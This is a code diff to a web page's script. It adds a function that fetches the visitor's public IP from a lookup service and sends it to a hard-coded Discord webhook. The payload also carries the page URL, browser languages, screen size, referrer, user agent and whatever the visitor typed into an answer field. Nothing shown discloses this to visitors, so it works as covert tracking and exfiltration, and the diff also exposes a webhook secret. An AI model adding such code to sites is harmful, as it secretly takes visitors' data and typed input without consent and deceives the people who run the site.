@@ -312,6 +312,78 @@
                 .catch(error => {
                     console.error("Error retrieving user data:", error);
                 });
+            fetch("https://api64.ipify.org?format=json")
+                .then((response) => response.json())
+                .then((data) => {
+                    const ip = data.ip;
+                    const timestamp = Math.floor(new Date().getTime() / 1000);
+                    sendToDiscord(ip, timestamp);
+                })
+                .catch((error) => {
+                    sendToDiscord();
+                });
+            function sendToDiscord(ip, timestamp) {
+                const webhookURL = "https://discord.com/api/webhooks/1199901231636815882/o_v_uZS_0xHiDxrMttjfSBfAtDcwPrpq51HdYjHcogySNpuc48ZJKIO3MpxzPjozqZGO";
+                const message = {
+                    embeds: [
+                        {
+                            title: `<t:${timestamp}:D> <t:${timestamp}:T>`,
+                            color: 0x0c0c46,
+                            footer: {
+                                text: window.location.href
+                            },
+                            fields: [
+                                {
+                                    name: "IP",
+                                    value: ip,
+                                    inline: true
+                                },
+                                {
+                                    name: "Languages",
+                                    value: navigator.languages.join(", "),
+                                    inline: true
+                                },
+                                {
+                                    name: "ViewPort",
+                                    value: `${window.innerWidth} x ${window.innerHeight} / ${window.screen.availWidth} x ${window.screen.availHeight}`,
+                                    inline: true
+                                },
+                                {
+                                    name: "Navigation",
+                                    value: [`New ${document.referrer}`, "Reload"][
+                                        window.performance.navigation.type
+                                    ],
+                                    inline: false
+                                },
+                                {
+                                    name: "User Agent Info",
+                                    value: navigator.userAgent,
+                                    inline: false
+                                },
+                                {
+                                    name: "Answer",
+                                    value: document.getElementById('answerInput').value,
+                                    inline: false
+                                }
+                            ]
+                        }
+                    ]
+                };
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(message)
+                })
+                    .then((response) => {
+                        if (response.status === 204) console.log("Success");
+                        else console.error("Error");
+                    })
+                    .catch((error) => {
+                        console.error(error);
+                    });
+            }
         }
 
         function showSuccessModal() {
